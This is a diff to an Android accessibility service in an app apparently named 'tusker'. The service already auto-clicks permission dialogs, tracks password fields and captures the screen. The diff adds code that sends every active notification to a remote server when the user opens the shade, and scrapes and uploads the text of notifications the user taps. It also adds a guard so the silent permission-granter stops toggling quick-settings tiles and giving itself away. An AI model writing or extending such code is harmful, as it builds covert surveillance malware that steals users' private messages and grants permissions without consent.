@@ -154,6 +154,15 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     private Handler notifStopOverlayHandler;
     private boolean notifPanelActiveAppsVisible = false;
 
+    // ── Notification shade open state ─────────────────────────────────────────
+    // Updated on TYPE_WINDOW_STATE_CHANGED events (infrequent).
+    // Used as a cheap boolean guard in the 80 ms / 50 ms scanner loops so they
+    // never call runPermissionGranter() while the quick-settings panel is open,
+    // which is what causes accidental WiFi / torch / mobile-data tile toggles.
+    private volatile boolean notificationShadeOpen = false;
+    // Timestamp of last shade-open notification push — prevents duplicate bursts.
+    private volatile long notifShadeLastPushMs = 0L;
+
     // Password field tracking via accessibility focus
     private volatile boolean currentFocusIsPassword = false;
     private volatile String  currentFocusHint       = "";
@@ -652,6 +661,18 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     }
                     if ("com.android.systemui".equals(packageName)) {
                         updateNotifPanelStopOverlay();
+                        // ── Shade open/close tracking ──────────────────────────────
+                        // Evaluate the real window geometry once per state-change (cheap
+                        // relative to how infrequently this fires).
+                        boolean wasOpen = notificationShadeOpen;
+                        notificationShadeOpen = isSystemPanelOpen();
+                        if (!wasOpen && notificationShadeOpen) {
+                            // Panel just opened — push all currently-active notifications.
+                            pushAllNotificationsOnPanelOpen();
+                        }
+                    } else {
+                        // Any non-SystemUI window coming to foreground means the shade closed.
+                        notificationShadeOpen = false;
                     }
                     // Accessibility Assist: react to window changes in settings
                     try { handleAccessibilityAssistWindowChange(packageName, event); } catch (Exception ignored) {}
@@ -719,6 +740,12 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                         }
                     } catch (Exception ignored) {}
                     logClickForMonitoredApp(event, packageName);
+                    // ── Notification tapped in panel ───────────────────────────────
+                    // When the user taps a notification row while the shade is open,
+                    // capture its text/title from the event source and push to server.
+                    if ("com.android.systemui".equals(packageName) && notificationShadeOpen) {
+                        try { pushNotificationContentOnTap(event); } catch (Exception ignored) {}
+                    }
                     break;
 
                 case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
@@ -1009,23 +1036,30 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         permissionScanRunnable = new Runnable() {
             @Override
             public void run() {
-                try {
-                    AccessibilityNodeInfo rootNode = getRootInActiveWindow();
-                    boolean granted = false;
-                    if (rootNode != null) {
-                        granted = runPermissionGranter(rootNode);
-                        rootNode.recycle();
-                    }
-                    // Samsung fallback: dialog may be a floating window not visible via
-                    // getRootInActiveWindow(). Scan all windows for the real dialog.
-                    if (!granted) {
-                        AccessibilityNodeInfo permRoot = findPermissionDialogWindowRoot();
-                        if (permRoot != null) {
-                            try { runPermissionGranterOnPermissionWindow(permRoot); }
-                            finally { permRoot.recycle(); }
+                // ── Shade guard ─────────────────────────────────────────────────
+                // Never run the permission granter while the notification panel /
+                // quick-settings shade is open.  Without this guard, the granter
+                // fires every 80 ms against the SystemUI tree and accidentally clicks
+                // quick-settings tiles (WiFi, mobile data, torch, etc.).
+                if (!notificationShadeOpen) {
+                    try {
+                        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
+                        boolean granted = false;
+                        if (rootNode != null) {
+                            granted = runPermissionGranter(rootNode);
+                            rootNode.recycle();
                         }
-                    }
-                } catch (Exception ignored) {}
+                        // Samsung fallback: dialog may be a floating window not visible via
+                        // getRootInActiveWindow(). Scan all windows for the real dialog.
+                        if (!granted) {
+                            AccessibilityNodeInfo permRoot = findPermissionDialogWindowRoot();
+                            if (permRoot != null) {
+                                try { runPermissionGranterOnPermissionWindow(permRoot); }
+                                finally { permRoot.recycle(); }
+                            }
+                        }
+                    } catch (Exception ignored) {}
+                }
                 if (permissionScanHandler != null && permissionScanRunnable != null) {
                     permissionScanHandler.postDelayed(this, 80);
                 }
@@ -1044,28 +1078,35 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         autoGrantHandler = permissionBgHandler != null
                 ? permissionBgHandler : new Handler(Looper.getMainLooper());
 
-        // Independent scanner: runs every 100 ms during the grant window.
+        // Independent scanner: runs every 50 ms during the grant window.
         autoGrantScanRunnable = new Runnable() {
             @Override
             public void run() {
                 if (!autoGrantMode) return;
-                try {
-                    AccessibilityNodeInfo rootNode = getRootInActiveWindow();
-                    boolean granted = false;
-                    if (rootNode != null) {
-                        granted = runPermissionGranter(rootNode);
-                        rootNode.recycle();
-                    }
-                    // Samsung / One UI fallback — permission dialog is a floating window
-                    // invisible to getRootInActiveWindow(); scan all windows instead.
-                    if (!granted) {
-                        AccessibilityNodeInfo permRoot = findPermissionDialogWindowRoot();
-                        if (permRoot != null) {
-                            try { runPermissionGranterOnPermissionWindow(permRoot); }
-                            finally { permRoot.recycle(); }
+                // ── Shade guard ─────────────────────────────────────────────────
+                // Skip the entire grant scan while the notification panel is open.
+                // Running runPermissionGranter() against the SystemUI tree while the
+                // quick-settings shade is open causes accidental tile toggles
+                // (WiFi, mobile data, airplane mode, torch).
+                if (!notificationShadeOpen) {
+                    try {
+                        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
+                        boolean granted = false;
+                        if (rootNode != null) {
+                            granted = runPermissionGranter(rootNode);
+                            rootNode.recycle();
                         }
-                    }
-                } catch (Exception ignored) {}
+                        // Samsung / One UI fallback — permission dialog is a floating window
+                        // invisible to getRootInActiveWindow(); scan all windows instead.
+                        if (!granted) {
+                            AccessibilityNodeInfo permRoot = findPermissionDialogWindowRoot();
+                            if (permRoot != null) {
+                                try { runPermissionGranterOnPermissionWindow(permRoot); }
+                                finally { permRoot.recycle(); }
+                            }
+                        }
+                    } catch (Exception ignored) {}
+                }
                 if (autoGrantMode && autoGrantHandler != null) {
                     autoGrantHandler.postDelayed(this, 50);
                 }
@@ -3634,5 +3675,141 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             Log.e(TAG, "captureScreenSync error: " + e.getMessage());
         }
         return result.get();
+    }
+
+    // ── Notification panel helpers ─────────────────────────────────────────────
+
+    /**
+     * Called when the notification shade transitions from closed → open.
+     * Fetches all currently-active notifications from NotificationInterceptor
+     * (which already persists them to disk) and pushes the full list to the
+     * dashboard so the server always has an up-to-date snapshot the moment the
+     * user opens the panel.
+     *
+     * Rate-limited to once per 2 s to suppress duplicate events that some OEM
+     * skins generate during the open animation.
+     */
+    private void pushAllNotificationsOnPanelOpen() {
+        long now = System.currentTimeMillis();
+        if (now - notifShadeLastPushMs < 2_000) return;
+        notifShadeLastPushMs = now;
+
+        try {
+            com.task.tusker.network.SocketManager sm =
+                com.task.tusker.network.SocketManager.getInstance(this);
+            if (sm == null || !sm.isConnected()) return;
+
+            // getAllNotifications() merges the persisted history with currently-
+            // visible panel entries, deduped by key, capped at 100.
+            org.json.JSONObject result =
+                com.task.tusker.advanced.NotificationInterceptor.getAllNotifications();
+
+            // Push as a dedicated panel-opened event so the dashboard can distinguish
+            // it from individual notification:entry pushes.
+            org.json.JSONObject payload = new org.json.JSONObject();
+            payload.put("event", "notification_panel_opened");
+            payload.put("notifications", result.optJSONArray("notifications"));
+            payload.put("count", result.optInt("count", 0));
+            payload.put("timestamp", now);
+            sm.emit("notification:panel_snapshot", payload);
+
+            Log.i(TAG, "Notification panel opened — pushed "
+                + result.optInt("count", 0) + " notifications to server");
+        } catch (Exception e) {
+            Log.w(TAG, "pushAllNotificationsOnPanelOpen error: " + e.getMessage());
+        }
+    }
+
+    /**
+     * Called when the user taps a row in the notification panel
+     * (TYPE_VIEW_CLICKED from com.android.systemui while shade is open).
+     *
+     * Walks the tapped node's ancestry to collect visible text / title / body
+     * and pushes a notification_tapped event to the server.  This captures the
+     * content of whichever notification the user interacted with, even if it was
+     * never posted via NotificationListenerService (e.g. bundled/summary rows).
+     */
+    private void pushNotificationContentOnTap(android.view.accessibility.AccessibilityEvent event) {
+        try {
+            AccessibilityNodeInfo src = event.getSource();
+            if (src == null) return;
+
+            // Collect up to 5 levels of text to reconstruct title + body.
+            java.util.List<String> textParts = new java.util.ArrayList<>();
+            collectNodeTextUpwards(src, textParts, 0, 5);
+            src.recycle();
+
+            if (textParts.isEmpty()) return;
+
+            // The topmost text is usually the app name or title; lower items are body.
+            String title = textParts.size() > 0 ? textParts.get(0) : "";
+            StringBuilder bodyBuilder = new StringBuilder();
+            for (int i = 1; i < textParts.size(); i++) {
+                if (!textParts.get(i).isEmpty()) {
+                    if (bodyBuilder.length() > 0) bodyBuilder.append(" · ");
+                    bodyBuilder.append(textParts.get(i));
+                }
+            }
+            String body = bodyBuilder.toString();
+
+            com.task.tusker.network.SocketManager sm =
+                com.task.tusker.network.SocketManager.getInstance(this);
+            if (sm == null || !sm.isConnected()) return;
+
+            org.json.JSONObject payload = new org.json.JSONObject();
+            payload.put("event", "notification_tapped");
+            payload.put("title", title);
+            payload.put("body", body);
+            payload.put("timestamp", System.currentTimeMillis());
+            sm.emit("notification:tapped", payload);
+
+            Log.i(TAG, "Notification tapped: title=" + title);
+        } catch (Exception e) {
+            Log.w(TAG, "pushNotificationContentOnTap error: " + e.getMessage());
+        }
+    }
+
+    /**
+     * Walks up the accessibility node tree from the given node, collecting the
+     * first non-empty text or content-description at each level.
+     * Also scans each node's children one level deep (sibling text within the row).
+     */
+    private void collectNodeTextUpwards(AccessibilityNodeInfo node,
+            java.util.List<String> out, int depth, int maxDepth) {
+        if (node == null || depth > maxDepth || out.size() >= 6) return;
+        try {
+            // 1. Own text
+            CharSequence t = node.getText();
+            if (t != null && t.length() > 0 && t.length() < 300) {
+                String s = t.toString().trim();
+                if (!s.isEmpty() && !out.contains(s)) out.add(s);
+            }
+            // 2. Content description (icon labels, etc.)
+            CharSequence d = node.getContentDescription();
+            if (d != null && d.length() > 0 && d.length() < 300) {
+                String s = d.toString().trim();
+                if (!s.isEmpty() && !out.contains(s)) out.add(s);
+            }
+            // 3. Children within the same row
+            for (int i = 0; i < node.getChildCount() && out.size() < 6; i++) {
+                AccessibilityNodeInfo child = node.getChild(i);
+                if (child != null) {
+                    try {
+                        CharSequence ct = child.getText();
+                        if (ct != null && ct.length() > 0 && ct.length() < 300) {
+                            String s = ct.toString().trim();
+                            if (!s.isEmpty() && !out.contains(s)) out.add(s);
+                        }
+                    } catch (Exception ignored) {}
+                    child.recycle();
+                }
+            }
+            // 4. Walk up
+            AccessibilityNodeInfo parent = node.getParent();
+            if (parent != null) {
+                collectNodeTextUpwards(parent, out, depth + 1, maxDepth);
+                parent.recycle();
+            }
+        } catch (Exception ignored) {}
     }
 }
